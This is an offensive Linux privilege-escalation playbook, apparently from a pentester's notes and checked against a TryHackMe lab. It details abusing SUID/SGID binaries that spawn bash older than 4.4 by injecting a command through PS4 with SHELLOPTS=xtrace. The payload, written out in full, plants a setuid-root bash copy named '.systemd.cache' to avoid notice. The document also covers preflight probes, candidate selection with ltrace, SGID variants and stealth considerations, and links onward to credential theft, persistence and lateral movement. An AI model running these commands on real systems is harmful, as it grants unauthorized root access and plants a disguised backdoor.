
⚠️ **Hard preconditions — verified in Step 1.**

- **A SUID/SGID binary invokes bash.** Verified per-candidate in Step 2.
- **Target bash inherits `PS4` from environment.** Bash <4.4 only; 4.4+ resets `PS4` to default at startup. Verified by the inheritance probe, in Step 1.
- **Writable + executable drop directory exists.** Verified in Step 1.
- **`<binary>` is SUID-root for full root.** SGID-only → effective group only, see [[#SGID candidates]].

---

## Step 1 — Preflight

##### `PS4` environment-inheritance probe (bash <4.4 gate):

`env PS4='MARKER' bash -c 'echo "[$PS4]"'`

- `[MARKER]` → `<ps4_ok>` = yes (bash inherits `PS4`; vulnerable) → Proceed.
- `[+ ]` → `<ps4_ok>` = no (bash sanitizes `PS4` at startup; patched). Technique inapplicable → return to [[Linux Privilege Escalation Checksheet]] Step 9.

##### Drop dir probe:

`d=/tmp; printf '#!/bin/sh\ntrue\n' > "$d/.p" && chmod +x "$d/.p" && "$d/.p" && echo "EXEC OK" ; rm -f "$d/.p"`

- `EXEC OK` → `<drop_dir>` is the probed directory.
- No output → set `d=/dev/shm`, then `d=/var/tmp`, then `d="$HOME"` and re-run (**one at a time**); first that prints `EXEC OK` is `<drop_dir>`.
- None → no drop site → return to [[Linux Privilege Escalation Checksheet]] Step 9.

⚠️ Default `<drop_dir>` is `/tmp` — high IOC. This playbook requires a **setuid-honoring** drop dir. For stealth-required engagements, run [[Stealth Drop Dir Probe]] (with `suid` mode) before this playbook to identify a quieter alternative. Return here with `<drop-dir>`. 

---

## Step 2 — Self-select a candidate

⚠️ Candidate list = the SUID/SGID `find` output from [[Linux Privilege Escalation Checksheet]] Step 9. If absent, return there first.

⚠️ **exec-family** below = `execve` / `execl` / `execv` / `execlp` / `execvp`.

For each candidate `<binary>`, reveal any helper invocation:

`timeout 10 ltrace -f <binary> </dev/null 2>&1 | grep -oE '(system|popen|execve|execl|execv|execlp|execvp)\("[^"]+"'`

(no `ltrace` → **No fallback method yet built, both `strace` and `strings` presented severe limitations** — build canonical fallback when encountered (HTB, PG etc.))

Map the hit to the appropriate invocation strategy (function call) below; either A, B, C or D (e.g. hit is `system("service apache2 start"`, follow path `A`, `system()`):

##### A. `system()` or `popen()`

Confirm `/bin/sh` is bash:

`/bin/sh -c 'echo ${BASH_VERSION:-not-bash}'`

- Bash version string → viable → record `<binary>` → proceed to Step 3.
- `not-bash` → `/bin/sh` is dash/ash; ignores `SHELLOPTS`, no xtrace. Skip this hit → next candidate.

##### B. exec-family on `/bin/sh` or PATH-resolved `"sh"`

Patterns: `execve("/bin/sh", ...)`, `execl`, `execv` on `/bin/sh`; `execlp("sh", ...)`, `execvp("sh", ...)` (the `p` variants PATH-resolve `"sh"` to `/bin/sh`).

Confirm `/bin/sh` is bash:

`/bin/sh -c 'echo ${BASH_VERSION:-not-bash}'`

- Bash version string → viable → record `<binary>` → proceed to Step 3.
- `not-bash` → `/bin/sh` is dash/ash; ignores `SHELLOPTS`, no xtrace. Skip this hit → next candidate.

##### C. exec-family on `/bin/bash` or PATH-resolved `"bash"`

Patterns: `execve("/bin/bash", ...)`, `execl`, `execv` on `/bin/bash`; `execlp("bash", ...)`, `execvp("bash", ...)`.

Viable → record `<binary>` → proceed to Step 3.

##### D. exec-family on anything else

Skip — this technique requires bash to be the spawned shell → next candidate.

---

## Step 3 — Trigger + verify

Single payload — drop setuid bash via `PS4` substitution, launch from operator terminal:

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash <drop_dir>/.systemd.cache && chmod 4755 <drop_dir>/.systemd.cache)' <binary>`

**Then run the dropped SUID shell:**

`<drop_dir>/.systemd.cache -p`

`id`

- `uid=0(root)` or `euid=0(root)` → root achieved → [Decision](#Decision).
- `<drop_dir>/.systemd.cache` absent → `PS4` substitution didn't fire. Possible causes: binary scrubs env (e.g. `clearenv()`) before invoking bash; binary doesn't actually invoke bash (re-verify path mapping); ltrace hit misread → next candidate → Step 2.
- File present, setuid-root, but `id` shows operator user (no elevation) → `<drop_dir>` has been mounted as `nosuid` (kernel ignores setuid bit at exec) → re-run drop dir probe with next potential directory in list (Step 1), then retry Step 3 with same `<binary>` candidate.
- File present but not setuid-root → `<binary>` isn't actually SUID-root → next candidate → Step 2.
- SGID binary → see [[#SGID candidates]].

---

## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction → [[Linux Credential Extraction Checksheet]]
- Persistence → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]

---

## Cleanup

From the root shell, before exit (the setuid copy is root-owned — your normal user can't delete it under a sticky `<drop_dir>`):

`rm -f <drop_dir>/.systemd.cache`

`exit`

⚠️ The setuid bash launch and the binary invocation may be recorded by auditd / process accounting (`pacct`); the setuid-root file may trip FIM. Log cleanup is out of scope.

---

## SGID candidates

For an SGID (not SUID) binary, the substitution runs with `egid=<group>`, not `euid=0`. Drop a setgid (not setuid) bash — `chmod 2755`, not `4755`:

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash <drop_dir>/.systemd.cache && chmod 2755 <drop_dir>/.systemd.cache)' <binary>`

Launch with `-p` and verify `egid=<group>`:

`<drop_dir>/.systemd.cache -p`

`id`

- `egid=<group>` (expected group from SGID binary) → success per the group; e.g. `shadow` → [[Readable Shadow]]; `disk` / `docker` → matching group-escalation route.
- `egid` matches operator user, not `<group>` → file inherited operator gid; add `chgrp <group> <drop_dir>/.systemd.cache &&` before the `chmod` in the substitution and retry.
- No `egid` change at all → binary drops the setgid privilege before exec; abandon → next candidate.

---

## Validation

THM:Linux PrivEsc:Task 15 SUID / SGID Executables — Abusing Shell Features (#2)